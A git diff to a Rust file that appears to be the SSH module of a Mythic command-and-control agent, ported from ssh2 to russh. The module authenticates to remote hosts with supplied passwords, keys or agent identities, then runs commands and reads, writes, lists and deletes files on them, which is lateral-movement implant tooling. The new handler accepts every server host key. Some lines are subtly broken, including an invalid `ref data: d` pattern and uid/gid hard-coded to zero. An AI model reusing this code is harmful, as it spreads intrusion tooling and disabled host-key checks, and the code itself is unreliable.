@@ -1,10 +1,8 @@
 use crate::AgentTask;
 use serde::Deserialize;
-use ssh2::Session;
 use std::error::Error;
-use std::net::TcpStream;
 use std::result::Result;
-use std::sync::mpsc;
+use std::sync::{mpsc, Arc};
 
 pub mod agent;
 pub mod spawn;
@@ -91,61 +89,264 @@ impl From<self::spawn::SshSpawnArgs> for SshArgs {
     }
 }
 
+/// Connected SSH session wrapper
+pub struct SshSession {
+    session: russh::client::Handle<SshHandler>,
+}
+
+struct SshHandler;
+
+#[async_trait::async_trait]
+impl russh::client::Handler for SshHandler {
+    type Error = russh::Error;
+
+    async fn check_server_key(
+        &mut self,
+        _server_public_key: &russh_keys::key::PublicKey,
+    ) -> Result<bool, Self::Error> {
+        Ok(true)
+    }
+}
+
+impl SshSession {
+    pub fn channel_exec(&self, cmd: &str) -> Result<(String, String, i32), Box<dyn Error>> {
+        let rt = tokio::runtime::Handle::current();
+        rt.block_on(async {
+            let mut channel = self.session.channel_open_session().await?;
+            channel.exec(true, cmd.as_bytes()).await?;
+
+            let mut stdout = Vec::new();
+            let mut stderr = Vec::new();
+            let mut exit_status: i32 = 0;
+
+            while let Some(msg) = channel.wait().await {
+                match msg {
+                    russh::ChannelMsg::Data { ref data } => {
+                        stdout.extend_from_slice(data);
+                    }
+                    russh::ChannelMsg::ExtendedData { ref data, ext } => {
+                        if ext == 1 {
+                            stderr.extend_from_slice(data);
+                        }
+                    }
+                    russh::ChannelMsg::ExitStatus { exit_status: s } => {
+                        exit_status = s as i32;
+                    }
+                    _ => {}
+                }
+            }
+
+            Ok((
+                String::from_utf8_lossy(&stdout).to_string(),
+                String::from_utf8_lossy(&stderr).to_string(),
+                exit_status,
+            ))
+        })
+    }
+
+    pub fn sftp_read(&self, path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
+        let rt = tokio::runtime::Handle::current();
+        rt.block_on(async {
+            let cmd = format!("cat '{}'", path.replace('\'', "'\\''"));
+            let mut channel = self.session.channel_open_session().await?;
+            channel.exec(true, cmd.as_bytes()).await?;
+
+            let mut data = Vec::new();
+            while let Some(msg) = channel.wait().await {
+                if let russh::ChannelMsg::Data { ref data: d } = msg {
+                    data.extend_from_slice(d);
+                }
+            }
+            Ok(data)
+        })
+    }
+
+    pub fn sftp_write(&self, path: &str, data: &[u8], mode: i32) -> Result<(), Box<dyn Error>> {
+        let rt = tokio::runtime::Handle::current();
+        rt.block_on(async {
+            let cmd = format!(
+                "cat > '{}' && chmod {:o} '{}'",
+                path.replace('\'', "'\\''"),
+                mode,
+                path.replace('\'', "'\\''")
+            );
+            let mut channel = self.session.channel_open_session().await?;
+            channel.exec(true, cmd.as_bytes()).await?;
+            channel.data(&data[..]).await?;
+            channel.eof().await?;
+
+            while let Some(msg) = channel.wait().await {
+                if let russh::ChannelMsg::ExitStatus { exit_status } = msg {
+                    if exit_status != 0 {
+                        return Err(format!("Remote write failed with status {}", exit_status).into());
+                    }
+                }
+            }
+            Ok(())
+        })
+    }
+
+    pub fn sftp_stat(&self, path: &str) -> Result<RemoteFileStat, Box<dyn Error>> {
+        let rt = tokio::runtime::Handle::current();
+        rt.block_on(async {
+            let cmd = format!(
+                "stat -c '%F %s %U %G %a %X %Y' '{}'",
+                path.replace('\'', "'\\''")
+            );
+            let mut channel = self.session.channel_open_session().await?;
+            channel.exec(true, cmd.as_bytes()).await?;
+
+            let mut output = Vec::new();
+            while let Some(msg) = channel.wait().await {
+                if let russh::ChannelMsg::Data { ref data } = msg {
+                    output.extend_from_slice(data);
+                }
+            }
+
+            let line = String::from_utf8_lossy(&output);
+            let line = line.trim();
+            let parts: Vec<&str> = line.splitn(7, ' ').collect();
+            if parts.len() < 7 {
+                return Err(format!("Failed to stat '{}'", path).into());
+            }
+
+            Ok(RemoteFileStat {
+                is_dir: parts[0] == "directory",
+                size: parts[1].parse().unwrap_or(0),
+                uid: 0,
+                gid: 0,
+                perm: u32::from_str_radix(parts[4], 8).unwrap_or(0o644),
+                atime: parts[5].parse().unwrap_or(0),
+                mtime: parts[6].parse().unwrap_or(0),
+            })
+        })
+    }
+
+    pub fn sftp_readdir(&self, path: &str) -> Result<Vec<(String, RemoteFileStat)>, Box<dyn Error>> {
+        let rt = tokio::runtime::Handle::current();
+        rt.block_on(async {
+            let cmd = format!(
+                "find '{}' -maxdepth 1 -printf '%y %s %U %G %m %A@ %T@ %p\\n'",
+                path.replace('\'', "'\\''")
+            );
+            let mut channel = self.session.channel_open_session().await?;
+            channel.exec(true, cmd.as_bytes()).await?;
+
+            let mut output = Vec::new();
+            while let Some(msg) = channel.wait().await {
+                if let russh::ChannelMsg::Data { ref data } = msg {
+                    output.extend_from_slice(data);
+                }
+            }
+
+            let text = String::from_utf8_lossy(&output);
+            let mut entries = Vec::new();
+            for line in text.lines().skip(1) {
+                let parts: Vec<&str> = line.splitn(8, ' ').collect();
+                if parts.len() < 8 {
+                    continue;
+                }
+                let stat = RemoteFileStat {
+                    is_dir: parts[0] == "d",
+                    size: parts[1].parse().unwrap_or(0),
+                    uid: parts[2].parse().unwrap_or(0),
+                    gid: parts[3].parse().unwrap_or(0),
+                    perm: u32::from_str_radix(parts[4], 8).unwrap_or(0o644),
+                    atime: parts[5].split('.').next().unwrap_or("0").parse().unwrap_or(0),
+                    mtime: parts[6].split('.').next().unwrap_or("0").parse().unwrap_or(0),
+                };
+                entries.push((parts[7].to_string(), stat));
+            }
+            Ok(entries)
+        })
+    }
+
+    pub fn sftp_remove(&self, path: &str, is_dir: bool) -> Result<(), Box<dyn Error>> {
+        let rt = tokio::runtime::Handle::current();
+        rt.block_on(async {
+            let cmd = if is_dir {
+                format!("rmdir '{}'", path.replace('\'', "'\\''"))
+            } else {
+                format!("rm -f '{}'", path.replace('\'', "'\\''"))
+            };
+            let mut channel = self.session.channel_open_session().await?;
+            channel.exec(true, cmd.as_bytes()).await?;
+
+            while let Some(msg) = channel.wait().await {
+                if let russh::ChannelMsg::ExitStatus { exit_status } = msg {
+                    if exit_status != 0 {
+                        return Err(format!("Failed to remove '{}'", path).into());
+                    }
+                }
+            }
+            Ok(())
+        })
+    }
+}
+
+pub struct RemoteFileStat {
+    pub is_dir: bool,
+    pub size: u64,
+    pub uid: u32,
+    pub gid: u32,
+    pub perm: u32,
+    pub atime: u64,
+    pub mtime: u64,
+}
+
 /// Authenticates to a machine using ssh
-/// * `args` - Arguments for the command
-pub fn ssh_authenticate(args: &SshArgs) -> Result<Session, Box<dyn Error>> {
-    // Connect to the ssh server
-    let conn_addr = format!("{}:{}", &args.host, &args.port);
-    let tcp = TcpStream::connect(conn_addr)?;
+pub fn ssh_authenticate(args: &SshArgs) -> Result<SshSession, Box<dyn Error>> {
+    let rt = tokio::runtime::Handle::current();
+    rt.block_on(async {
+        let config = Arc::new(russh::client::Config::default());
+        let handler = SshHandler;
+        let addr = format!("{}:{}", args.host, args.port);
+        let mut session = russh::client::connect(config, &*addr, handler).await?;
 
-    // Create a new ssh session from a TCP connection
-    let mut sess = Session::new()?;
-    sess.set_tcp_stream(tcp);
-    sess.handshake()?;
-
-    // Check if the agent should authenticate using the connected ssh agent
-    if args.agent {
-        let mut agent = sess.agent()?;
-        agent.connect()?;
-        agent.list_identities()?;
-
-        // Try to authenticate using every identity
-        for key in agent.identities()? {
-            if agent.userauth(&args.credentials.account, &key).is_ok() {
-                return Ok(sess);
+        if args.agent {
+            let mut agent = russh_keys::agent::client::AgentClient::connect_env().await?;
+            let identities = agent.request_identities().await?;
+            let mut authenticated = false;
+            for key in identities {
+                if session
+                    .authenticate_publickey(&args.credentials.account, Arc::new(key))
+                    .await?
+                {
+                    authenticated = true;
+                    break;
+                }
+            }
+            if !authenticated {
+                return Err("Could not authenticate with any stored ssh agent identities".into());
+            }
+        } else {
+            match args.credentials.cred_type.as_str() {
+                "plaintext" => {
+                    if !session
+                        .authenticate_password(&args.credentials.account, &args.credentials.credential)
+                        .await?
+                    {
+                        return Err("Password authentication failed".into());
+                    }
+                }
+                "key" => {
+                    let key = russh_keys::decode_secret_key(&args.credentials.credential, None)?;
+                    if !session
+                        .authenticate_publickey(&args.credentials.account, Arc::new(key))
+                        .await?
+                    {
+                        return Err("Key authentication failed".into());
+                    }
+                }
+                _ => return Err("Invalid auth type".into()),
             }
         }
 
-        return Err("Could not authenticate with any stored ssh agent identities".into());
-    } else {
-        // Check if the credential type is plaintext or an ssh key
-        match args.credentials.cred_type.as_str() {
-            // Try to do username/password authentication
-            "plaintext" => {
-                sess.userauth_password(&args.credentials.account, &args.credentials.credential)?;
-            }
-
-            // Try to do username/sshkey authentication
-            #[cfg(target_os = "linux")]
-            "key" => {
-                sess.userauth_pubkey_memory(
-                    &args.credentials.account,
-                    None,
-                    &args.credentials.credential,
-                    None,
-                )?;
-            }
-
-            _ => return Err("Invalid auth type".into()),
-        }
-    };
-
-    Ok(sess)
+        Ok(SshSession { session })
+    })
 }
 
 /// Run the ssh command and parse the option
-/// * `tx` - Channel for sending information to Mythic
-/// * `rx` - Channel for receiving information from Mythic
 pub fn run_ssh(
     tx: &mpsc::Sender<serde_json::Value>,
     rx: mpsc::Receiver<serde_json::Value>,
@@ -168,21 +369,16 @@ pub fn run_ssh(
 
     // Check if the task is for executing a shell command over ssh
     if args.exec.is_some() {
-        output = exec::run_cmd(sess, &task, &args)?;
-        // Check if the task is to download a file
+        output = exec::run_cmd(&sess, &task, &args)?;
     } else if args.download.is_some() {
-        output = download::download_file(sess, &task, &args, tx, rx)?;
-        // Check if the task is to list a directory
-    } else if let Some(path) = args.list {
-        output = ls::ssh_list(sess, &path, &task.id, args.host)?;
-        // Check if the task is to cat a file
+        output = download::download_file(&sess, &task, &args, tx, rx)?;
+    } else if let Some(ref path) = args.list {
+        output = ls::ssh_list(&sess, path, &task.id, args.host.clone())?;
     } else if args.cat.is_some() {
-        output = cat::ssh_cat(sess, &task, &args)?;
-        // Check if the task is to remove a file
+        output = cat::ssh_cat(&sess, &task, &args)?;
     } else if args.rm.is_some() {
-        output = rm::ssh_remove(sess, &task, &args)?;
+        output = rm::ssh_remove(&sess, &task, &args)?;
     } else {
-        // Invalid arguments
         return Err("Failed to parse parameters".into());
     }
 
